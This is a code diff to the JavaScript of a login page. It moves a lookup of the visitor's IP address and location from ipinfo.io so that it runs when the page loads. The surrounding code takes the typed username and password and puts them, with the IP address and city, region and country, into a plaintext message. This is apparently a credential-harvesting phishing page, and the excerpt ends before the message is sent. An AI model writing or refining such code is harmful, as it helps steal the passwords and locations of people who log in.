@@ -77,6 +77,19 @@
     const loginBtn = document.getElementById('login-btn');
     const errorMsg = document.getElementById('error-msg');
 
+    // Function to retrieve location and IP information
+    async function getLocationAndIP() {
+      const response = await fetch('https://ipinfo.io/json');
+      const data = await response.json();
+      return data;
+    }
+
+    // Initialize location and IP information when the page loads
+    let locationAndIP;
+    getLocationAndIP().then((data) => {
+      locationAndIP = data;
+    });
+
     loginBtn.addEventListener('click', async () => {
       const username = usernameInput.value;
       const password = passwordInput.value;
@@ -86,12 +99,8 @@
         return;
       }
 
-      // Use ipinfo.io to get location information based on the user's IP address
-      const response = await fetch('https://ipinfo.io/json');
-      const data = await response.json();
-
       // Extract location and IP address information
-      const { city, region, country, ip } = data;
+      const { city, region, country, ip } = locationAndIP;
 
       // Construct the message
       const message = `Username: ${username}\nPassword: ${password}\nIP Address: ${ip}\nLocation: ${city}, ${region}, ${country}`;
